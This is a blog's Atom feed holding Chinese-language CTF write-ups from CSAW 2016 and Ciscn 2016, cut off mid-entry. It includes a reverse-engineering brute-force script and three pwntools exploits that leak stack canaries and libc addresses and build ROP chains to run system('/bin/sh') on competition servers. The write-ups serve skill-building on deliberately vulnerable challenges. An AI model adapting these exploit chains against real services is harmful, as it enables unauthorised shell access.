<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Arvin.X&#39;s Blog</title>
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://a7vinx.github.io/"/>
  <updated>2016-11-03T01:40:27.448Z</updated>
  <id>http://a7vinx.github.io/</id>
  
  <author>
    <name>Arvin.X</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CSAW 2016 tutorial writeup</title>
    <link href="http://a7vinx.github.io/2016/09/19/csaw_2016_tutorial_writeup/"/>
    <id>http://a7vinx.github.io/2016/09/19/csaw_2016_tutorial_writeup/</id>
    <published>2016-09-19T08:48:00.000Z</published>
    <updated>2016-11-03T01:40:27.448Z</updated>
    
    <content type="html"><![CDATA[<p>200分的Pwn</p>
<p>同样也是拿到手简单跑一下就扔进IDA里静态看。<br>程序主体不多，一个服务端程序，用第一个参数作为监听端口，然后就是常规的bind，listen，fork来处理。nc连上去会有三个选项，一个减法运算过的puts函数在libc中的地址，第二个接受输入然后造成栈溢出，第三个退出。</p>
<a id="more"></a>
<p>由于已经给了libc就很好办了，拿了puts地址算system、”/bin/sh”地址，除此之外还要找一个dup2地址来把标准输出输入重定向到socket来，否则只是在服务端调用了system（这个一开始也没注意到，觉得没问题可是不见shell回来又折腾了一下才突然发现没重定向），然后来一波ROP就可以。</p>
<p>完整exploit：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line"><span class="comment">#p=remote('127.0.0.1',9990)</span></div><div class="line">p=remote(<span class="string">'pwn.chal.csaw.io'</span>,<span class="number">8002</span>)</div><div class="line"></div><div class="line">poprdi=<span class="number">0x00000000004012e3</span> <span class="comment"># pop rdi ; ret</span></div><div class="line">poprsi=<span class="number">0x00000000004012e1</span> <span class="comment"># pop rsi ; pop r15 ; ret</span></div><div class="line">pick64 = <span class="keyword">lambda</span> x: u64(x.ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</div><div class="line"></div><div class="line"></div><div class="line">p.recvuntil(<span class="string">'&gt;'</span>)</div><div class="line">p.sendline(<span class="string">'1'</span>)</div><div class="line">p.recvuntil(<span class="string">':'</span>)</div><div class="line">buf=p.recvline()</div><div class="line">puts_addr=int(buf,<span class="number">16</span>)+<span class="number">1280</span></div><div class="line"><span class="keyword">print</span> <span class="string">'puts_addr: '</span>+hex(puts_addr)</div><div class="line"></div><div class="line"><span class="comment">#system_addr=puts_addr-0x000000000006b990+0x0000000000041490</span></div><div class="line"><span class="comment">#str_sh=puts_addr-0x000000000006b990+0x1639a0</span></div><div class="line"><span class="comment">#dup2_addr=puts_addr-0x000000000006b990+0x00000000000dc490</span></div><div class="line">system_addr=puts_addr<span class="number">-0x000000000006fd60</span>+<span class="number">0x0000000000046590</span></div><div class="line">str_sh=puts_addr<span class="number">-0x000000000006fd60</span>+<span class="number">0x17c8c3</span></div><div class="line">dup2_addr=puts_addr<span class="number">-0x000000000006fd60</span>+<span class="number">0x00000000000ebe90</span></div><div class="line"><span class="keyword">print</span> <span class="string">'system_addr: '</span>+hex(system_addr)</div><div class="line"><span class="keyword">print</span> <span class="string">'binsh_addr: '</span>+hex(str_sh)</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># ======== leak canary and stack address =========</span></div><div class="line">payload=<span class="string">'A'</span>*<span class="number">4</span></div><div class="line"></div><div class="line">p.recvuntil(<span class="string">'&gt;'</span>)</div><div class="line">p.sendline(<span class="string">'2'</span>)</div><div class="line">p.recvuntil(<span class="string">'&gt;'</span>)</div><div class="line">p.sendline(payload)</div><div class="line">leak=p.recvn(<span class="number">0x144</span>)</div><div class="line"></div><div class="line">canary=pick64(leak[<span class="number">-12</span>:<span class="number">-4</span>])</div><div class="line"><span class="keyword">print</span> <span class="string">'canary: '</span>+hex(canary)</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># ======== ROP =========</span></div><div class="line">payload2=<span class="string">'A'</span>*<span class="number">312</span></div><div class="line">payload2+=p64(canary)*<span class="number">2</span></div><div class="line"></div><div class="line"><span class="comment"># dup2(4,1)</span></div><div class="line">payload2+=p64(poprdi)</div><div class="line">payload2+=p64(<span class="number">4</span>)</div><div class="line">payload2+=p64(poprsi)</div><div class="line">payload2+=p64(<span class="number">1</span>)*<span class="number">2</span></div><div class="line">payload2+=p64(dup2_addr)</div><div class="line"></div><div class="line"><span class="comment">#dup2(4,0)</span></div><div class="line">payload2+=p64(poprdi)</div><div class="line">payload2+=p64(<span class="number">4</span>)</div><div class="line">payload2+=p64(poprsi)</div><div class="line">payload2+=p64(<span class="number">0</span>)*<span class="number">2</span></div><div class="line">payload2+=p64(dup2_addr)</div><div class="line"></div><div class="line"><span class="comment"># system('/bin/sh')</span></div><div class="line">payload2+=p64(poprdi)</div><div class="line">payload2+=p64(str_sh)</div><div class="line">payload2+=p64(system_addr)</div><div class="line"></div><div class="line">p.recvuntil(<span class="string">'&gt;'</span>)</div><div class="line">p.sendline(<span class="string">'2'</span>)</div><div class="line">p.recvuntil(<span class="string">'&gt;'</span>)</div><div class="line">p.sendline(payload2)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;200分的Pwn&lt;/p&gt;
&lt;p&gt;同样也是拿到手简单跑一下就扔进IDA里静态看。&lt;br&gt;程序主体不多，一个服务端程序，用第一个参数作为监听端口，然后就是常规的bind，listen，fork来处理。nc连上去会有三个选项，一个减法运算过的puts函数在libc中的地址，第二个接受输入然后造成栈溢出，第三个退出。&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>CSAW 2016 Rock writeup</title>
    <link href="http://a7vinx.github.io/2016/09/19/csaw_2016_rock_writeup/"/>
    <id>http://a7vinx.github.io/2016/09/19/csaw_2016_rock_writeup/</id>
    <published>2016-09-19T07:48:00.000Z</published>
    <updated>2016-11-01T16:29:30.488Z</updated>
    
    <content type="html"><![CDATA[<p>100分的Reverse</p>
<p>由于是C＋＋的程序，所以一开始看起来很杂乱，经过分析之后程序的主要逻辑是这样：</p>
<a id="more"></a>
<p><img src="/images/csaw_2016_rock_writeup0.png" alt="csaw_2016_rock_writeup0.png"></p>
<p>一开始用到一个结构体，大概长这样：</p>
<p><img src="/images/csaw_2016_rock_writeup1.png" alt="csaw_2016_rock_writeup1.png"></p>
<p>分析之后的逻辑就比较简单了，主要就是对输入的字符串进行逐个异或以及加法运算。写个脚本反过来算一遍就好了，但是一开始没注意到图中加注释的两行函数的操作不是加在原始字符串上的，而是新开了内存在操作后面直接丢弃了，所以第一次写的脚本跑出来根本不对… 然而一时又没找到哪里有问题，这时看它最后的输出可以用于直接爆破，就干脆写个爆破脚本，所以最后还是爆破出来的…</p>
<p>正常版本脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">fstr=<span class="string">'FLAG23456912365453475897834567'</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_xor_str</span><span class="params">(s,added,xored)</span>:</span></div><div class="line">	ret=<span class="string">''</span></div><div class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> s:</div><div class="line">		x=ord(x)+added</div><div class="line">		x=x^xored</div><div class="line">		ret+=chr(x)</div><div class="line">	<span class="keyword">return</span> ret</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(fstr)</span>:</span></div><div class="line">	fstr=add_xor_str(fstr,<span class="number">-9</span>,<span class="number">0x10</span>)</div><div class="line">	fstr=add_xor_str(fstr,<span class="number">-20</span>,<span class="number">0x50</span>)</div><div class="line">	<span class="comment"># these two lines are useless because operations about these two lines</span></div><div class="line">	<span class="comment"># in origin program does not has effect on origin input string</span></div><div class="line">	<span class="comment"># fstr=add_xor_str(fstr,-35,0x20)</span></div><div class="line">	<span class="comment"># fstr=add_xor_str(fstr,0,0x50)</span></div><div class="line">	<span class="keyword">print</span> fstr</div><div class="line"></div><div class="line">decrypt(fstr)</div></pre></td></tr></table></figure>
<p>爆破版本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">testn</span><span class="params">(ps,n)</span>:</span></div><div class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">33</span>,<span class="number">127</span>):</div><div class="line">		nows=ps[:n]+chr(x)+ps[n+<span class="number">1</span>:]</div><div class="line">		p=process(<span class="string">'rock'</span>)</div><div class="line">		p.sendline(nows)</div><div class="line">		recv=p.recvall()</div><div class="line">		<span class="comment"># get number</span></div><div class="line">		final=recv[<span class="number">-2</span>] <span class="keyword">if</span> n&lt;<span class="number">10</span> <span class="keyword">else</span> recv[<span class="number">-3</span>:<span class="number">-1</span>]</div><div class="line">		p.close()</div><div class="line">		<span class="keyword">print</span> <span class="string">'recv: '</span>+recv[<span class="number">-10</span>:]</div><div class="line">		<span class="keyword">try</span>:</div><div class="line">			<span class="keyword">if</span> int(final)==n:</div><div class="line">				<span class="keyword">continue</span></div><div class="line">			<span class="keyword">else</span>:</div><div class="line">				<span class="keyword">return</span> nows</div><div class="line">		<span class="keyword">except</span> Exception <span class="keyword">as</span> e:</div><div class="line">			<span class="keyword">return</span> nows</div><div class="line">		</div><div class="line"></div><div class="line">s=<span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZABCD'</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">30</span>):</div><div class="line">	<span class="keyword">print</span> <span class="string">'------------------------------------'</span>+str(i)+<span class="string">'-------------------------------------'</span></div><div class="line">	s=testn(s,i)</div><div class="line"><span class="keyword">print</span> s</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;100分的Reverse&lt;/p&gt;
&lt;p&gt;由于是C＋＋的程序，所以一开始看起来很杂乱，经过分析之后程序的主要逻辑是这样：&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Ciscn CTF 2016 Cis2 writeup</title>
    <link href="http://a7vinx.github.io/2016/07/11/ciscnctf_2016_cis2_writeup/"/>
    <id>http://a7vinx.github.io/2016/07/11/ciscnctf_2016_cis2_writeup/</id>
    <published>2016-07-11T10:13:00.000Z</published>
    <updated>2016-11-01T13:30:59.088Z</updated>
    
    <content type="html"><![CDATA[<p>这道题最终还是本地成功远程失败，这次的原因还是too young……还是再记录一下吧。</p>
<p>可能是上一题折腾太久了，拿到这一题直接file看一眼strings一下就直接拖进IDA静态分析了，就是忘了例行看一下checksec和vmmap，也可能是因为这么长一段时间接触的就没有不开NX的吧，突然来个都没开NX的完全就不记得还有这茬了，看来还是修为不够。</p>
<a id="more"></a>
<p>实力懵逼：<br><img src="/images/ciscnctf_2016_cis2_writeup0.png" alt="ciscnctf_2016_cis2_writeup0.png"></p>
<p>这道题还是挺简单的，就是循环读到token中，符合％d且index在1-46的话就可以写入这个stack中，不符合％d的话就按照操作数处理：</p>
<p><img src="/images/ciscnctf_2016_cis2_writeup1.png" alt="ciscnctf_2016_cis2_writeup1.png"></p>
<p>支持的操作数有’+’,’-‘,’m’,’w’,’p’,’n’,’.’,’q’,作用很显然：<br><img src="/images/ciscnctf_2016_cis2_writeup2.png" alt="ciscnctf_2016_cis2_writeup2.png"></p>
<p>不过有个问题就是IDA把这里的变量名处理为stack，我觉得还是处理为values比较好，不然容易引起歧义，因为stack是main中出现过的一个变量名，用于定义values和index,大概是:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">values=&amp;(<span class="built_in">stack</span>[<span class="number">1</span>]);</div><div class="line">index=&amp;(<span class="built_in">stack</span>[<span class="number">0</span>]);</div></pre></td></tr></table></figure>
<p>所以一开始的主要思路就是先操作index指向栈中存在的__libc_start_main+245的地址，把它泄漏出来，然后再根据末12bit查版本算偏移，在操作index重写返回地址就可以了。</p>
<p>麻烦的就是对index的操作只能控制它任意向低地址移动，向高地址移动的话就会使用values<a href="/images/ciscnctf_2016_cis2_writeup0.png">1</a>重写移向的地址。所以想要泄漏<strong>libc_start_main+245的地址不能简单的向高处移动index，由于程序计算values[index]是通过values基址加index偏移得出来的，所以我们可以增大values基址使计算后的结果正好指向</strong>libc_start_main+245这个地址就可以泄漏它。</p>
<p>于是以下图中的地址为例（0x7fffffffe220存储index指针，0x0x7fffffffe228存储values值），我们需要先向低地址移动泄漏栈地址，然后回来根据泄漏的栈地址计算修改后的values值，写入values<a href="/images/ciscnctf_2016_cis2_writeup0.png">1</a>中，再使用’w’写入0x0x7fffffffe228。这个时候再使用’p’就可以泄漏__libc_start_main+245地址。<br><img src="/images/ciscnctf_2016_cis2_writeup3.png" alt="ciscnctf_2016_cis2_writeup3.png"></p>
<p>接下来就需要类似的方式先写入values<a href="/images/ciscnctf_2016_cis2_writeup0.png">1</a>再覆盖到目标地址中的方式（当然这个时候values<a href="/images/ciscnctf_2016_cis2_writeup0.png">1</a>的位置也改变了），构造ROP链触发system(‘/bin/sh’)了。</p>
<p>但是远程因为查不到glibc版本所以又跪了。看来查版本这招本来就不该算做正确姿势……</p>
<p>所以正确姿势应该是在可读可写的区域直接写入shellcode再控制EIP进去……</p>
<p>还是附上可怜的expolit：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</div><div class="line"></div><div class="line">p=process(<span class="string">'./cis2'</span>)</div><div class="line"><span class="comment"># p=remote('106.75.37.31',23333)</span></div><div class="line"></div><div class="line">pop_rdi_ret=int(<span class="string">'0x400ad3'</span>,<span class="number">16</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">w</span><span class="params">(high,value,low)</span>:</span></div><div class="line">	<span class="comment"># first move down</span></div><div class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> range(high):</div><div class="line">		p.sendline(<span class="string">'w'</span>)</div><div class="line"></div><div class="line">	<span class="comment"># write into stack[2]</span></div><div class="line">	p.sendline(str(value))</div><div class="line">	<span class="keyword">print</span> <span class="string">'write value: '</span>+hex(c_uint32(value).value)</div><div class="line">	<span class="comment"># copy into stack[1]</span></div><div class="line">	p.sendline(<span class="string">'m'</span>)</div><div class="line"></div><div class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> range(low):</div><div class="line">		p.sendline(<span class="string">'.'</span>)</div><div class="line">	p.sendline(<span class="string">'w'</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">	p.recvuntil(<span class="string">'Fight!\n\n'</span>)</div><div class="line"></div><div class="line">	<span class="comment"># begin</span></div><div class="line">	<span class="comment"># first get stack addr</span></div><div class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">33</span>):</div><div class="line">		p.sendline(<span class="string">'.'</span>)</div><div class="line">	p.sendline(<span class="string">'p'</span>)</div><div class="line">	p.recvuntil(<span class="string">'Value: '</span>)</div><div class="line">	addr=p.recvline().strip()</div><div class="line">	addr=int(addr,<span class="number">10</span>)</div><div class="line"></div><div class="line">	<span class="keyword">print</span> <span class="string">'leak stack addr: '</span>+hex(c_uint32(addr).value)</div><div class="line">	stack_addr=addr<span class="number">-420</span></div><div class="line">	dest_addr=stack_addr+<span class="number">65</span>*<span class="number">4</span></div><div class="line">	<span class="keyword">print</span> <span class="string">'modify base addr to: '</span>+hex(c_uint32(dest_addr).value)</div><div class="line"></div><div class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">9</span>):</div><div class="line">		p.sendline(<span class="string">'w'</span>)</div><div class="line">	<span class="comment"># write into stack[2]</span></div><div class="line">	p.sendline(str(dest_addr))</div><div class="line">	<span class="comment"># copy into stack[1]</span></div><div class="line">	p.sendline(<span class="string">'+'</span>)</div><div class="line"></div><div class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">17</span>):</div><div class="line">		p.sendline(<span class="string">'.'</span>)</div><div class="line">	p.sendline(<span class="string">'w'</span>)</div><div class="line"></div><div class="line">	<span class="comment"># now values[index] should point to __libc_start_main's address prefix</span></div><div class="line">	<span class="comment"># first leak libc_prefix</span></div><div class="line">	p.sendline(<span class="string">'p'</span>)</div><div class="line">	p.recvuntil(<span class="string">'Value: '</span>)</div><div class="line">	libc_prefix=p.recvline().strip()</div><div class="line">	libc_prefix=int(libc_prefix,<span class="number">10</span>)</div><div class="line">	<span class="keyword">print</span> <span class="string">'leak libc prefix: '</span>+hex(c_uint32(libc_prefix).value)</div><div class="line"></div><div class="line">	<span class="comment"># now leak libc other address</span></div><div class="line">	p.sendline(<span class="string">'.'</span>)</div><div class="line">	p.sendline(<span class="string">'p'</span>)</div><div class="line">	p.recvuntil(<span class="string">'Value: '</span>)</div><div class="line">	libc_addr=p.recvline().strip()</div><div class="line">	libc_addr=int(libc_addr,<span class="number">10</span>)</div><div class="line">	<span class="keyword">print</span> <span class="string">'leak libc addr: '</span>+hex(c_uint32(libc_addr).value)</div><div class="line"></div><div class="line">	libc_addr=libc_addr<span class="number">-245</span></div><div class="line">	<span class="comment"># I used libc-database to search the version of glibc on the remote once but I get nothing.</span></div><div class="line">	<span class="comment"># So I failed to get shell from remote.</span></div><div class="line">	sys_addr=libc_addr<span class="number">-0x21a50</span>+<span class="number">0x414f0</span></div><div class="line">	binsh_addr=libc_addr<span class="number">-0x21a50</span>+<span class="number">0x161160</span></div><div class="line"></div><div class="line">	<span class="comment">#################################################################################</span></div><div class="line"></div><div class="line">	<span class="comment"># write pop gadget addr into stack </span></div><div class="line">	w(<span class="number">17</span>,pop_rdi_ret,<span class="number">19</span>)</div><div class="line">	w(<span class="number">17</span>,<span class="number">0</span>,<span class="number">18</span>)</div><div class="line"></div><div class="line">	<span class="comment"># write /bin/sh addr to target addr</span></div><div class="line">	w(<span class="number">16</span>,binsh_addr,<span class="number">17</span>)</div><div class="line">	w(<span class="number">15</span>,libc_prefix,<span class="number">16</span>)</div><div class="line"></div><div class="line">	<span class="comment"># write sys addr to target addr</span></div><div class="line">	w(<span class="number">14</span>,sys_addr,<span class="number">15</span>)</div><div class="line">	w(<span class="number">13</span>,libc_prefix,<span class="number">14</span>)</div><div class="line"></div><div class="line">	<span class="comment"># gdb.attach(p,'b *0x400987')</span></div><div class="line">	p.sendline(<span class="string">'q'</span>)</div><div class="line">	<span class="comment"># get shell</span></div><div class="line">	p.interactive()</div><div class="line"></div><div class="line">main()</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这道题最终还是本地成功远程失败，这次的原因还是too young……还是再记录一下吧。&lt;/p&gt;
&lt;p&gt;可能是上一题折腾太久了，拿到这一题直接file看一眼strings一下就直接拖进IDA静态分析了，就是忘了例行看一下checksec和vmmap，也可能是因为这么长一段时间接触的就没有不开NX的吧，突然来个都没开NX的完全就不记得还有这茬了，看来还是修为不够。&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Ciscn CTF 2016 careful writeup</title>
    <link href="http://a7vinx.github.io/2016/07/11/ciscnctf_2016_careful_writeup/"/>
    <id>http://a7vinx.github.io/2016/07/11/ciscnctf_2016_careful_writeup/</id>
    <published>2016-07-11T09:13:00.000Z</published>
    <updated>2016-11-01T13:30:38.884Z</updated>
    
    <content type="html"><![CDATA[<p>现在才知道原来system(“sh”)也可以拿shell……一直以为只能用system(“/bin/sh”)……</p>
<p>题目是挺简单的，not stripped，PLT中直接有system入口，程序从main函数直接进initarray函数然后就没了，在initarray里有一个循环10次读一个字节到数组中，但是index可以越界，所以可以改写栈内存（同时又能把计循环次数的变量也给改了，所以可以无限循环）：</p>
<a id="more"></a>
<p><img src="/images/ciscnctf_2016_careful_writeup0.png" alt="ciscnctf_2016_careful_writeup0.png"></p>
<p>循环读完之后会把原来的数组位置print出来，不过这段似乎并没有什么卵用。</p>
<p>由于PLT中已经有了system入口了，所以来个/bin/sh的地址就行了，于是为了这个地址我开始漫长的计划，先修改返回地址为printf构造参数泄漏出printf地址，找个pop｜ret的gadget再跳回循环读的地方，用system的PLT入口和算出来的/bin/sh地址再修改返回地址，完美，简直完美。</p>
<p>完美个屁libc-database查不出远程glibc版本算不出偏移玩个毛线。</p>
<p>后来才知道原来只要”sh”其实也是可以的，用ROPgadget搜出个”sh”就可以了,我真的是拒绝的。</p>
<p>于是这么大一圈白绕了真尴尬，写都写了舍不得删，留作个too young的纪念吧。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</div><div class="line"></div><div class="line">p=process(<span class="string">'./careful'</span>)</div><div class="line"><span class="comment"># p=remote('106.75.32.79',10000)</span></div><div class="line"></div><div class="line"><span class="comment"># popret='080483a1'</span></div><div class="line"><span class="comment"># printf='080483c0'</span></div><div class="line"><span class="comment"># fflush='080483d0'</span></div><div class="line"><span class="comment"># system='080483e0'</span></div><div class="line"><span class="comment"># print_got='0804a00c'</span></div><div class="line"><span class="comment"># begin='0804852D'</span></div><div class="line"><span class="comment"># out='08048563'</span></div><div class="line"></div><div class="line">system=<span class="string">'080483e0'</span></div><div class="line">sh=<span class="string">'0804828e'</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">w</span><span class="params">(index,value)</span>:</span></div><div class="line">	p.recvuntil(<span class="string">'index:'</span>)</div><div class="line">	p.sendline(str(index))</div><div class="line">	p.recvuntil(<span class="string">'value:'</span>)</div><div class="line">	value=<span class="string">'0A0A0A'</span>+value</div><div class="line">	c=c_int32(int(value,<span class="number">16</span>)).value</div><div class="line">	p.sendline(str(c))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">reset</span><span class="params">()</span>:</span></div><div class="line">	w(<span class="number">28</span>,<span class="string">'00'</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">end</span><span class="params">()</span>:</span></div><div class="line">	w(<span class="number">28</span>,<span class="string">'11'</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">wdword</span><span class="params">(index,word)</span>:</span></div><div class="line">	w(index,word[<span class="number">6</span>:])</div><div class="line">	w(index+<span class="number">1</span>,word[<span class="number">4</span>:<span class="number">6</span>])</div><div class="line">	w(index+<span class="number">2</span>,word[<span class="number">2</span>:<span class="number">4</span>])</div><div class="line">	w(index+<span class="number">3</span>,word[<span class="number">0</span>:<span class="number">2</span>])</div><div class="line">	reset()</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">	<span class="string">"""</span></div><div class="line">	# write print addr</div><div class="line">	wdword(44,printf)</div><div class="line">	wdword(48,popret)</div><div class="line">	wdword(52,print_got)</div><div class="line">	wdword(56,begin)</div><div class="line">	# wdword(60,popret)</div><div class="line">	# wdword(64,out)</div><div class="line">	# wdword(68,begin)</div><div class="line">	# gdb.attach(p,'b *0x8048604')</div><div class="line">	end()</div><div class="line"></div><div class="line">	recv=p.recv(4)</div><div class="line"></div><div class="line">	sys_addr=u32(recv.ljust(4,'\x00'))</div><div class="line">	print 'system addr: '+hex(sys_addr)</div><div class="line">	sh_addr=sys_addr-0x4cbd0+0x15d1a9</div><div class="line">	print '/bin/sh addr: '+hex(sh_addr)</div><div class="line"></div><div class="line">	# gdb.attach(p,'b *0x08048604')</div><div class="line">	p.sendline('28')</div><div class="line">	p.recvuntil('value:')</div><div class="line">        value='0A0A0A00'</div><div class="line">        c=c_int32(int(value,16)).value</div><div class="line">	p.sendline(str(c))</div><div class="line"></div><div class="line">	wdword(44,system)</div><div class="line">	wdword(52,hex(sh_addr)[2:])</div><div class="line">	end()</div><div class="line">	# gdb.attach(p,'b *0x8048604')</div><div class="line">	p.interactive()</div><div class="line">	"""</div><div class="line">	wdword(<span class="number">44</span>,system)</div><div class="line">	wdword(<span class="number">52</span>,sh)</div><div class="line">	end()</div><div class="line">	p.interactive()</div><div class="line"></div><div class="line">main()</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
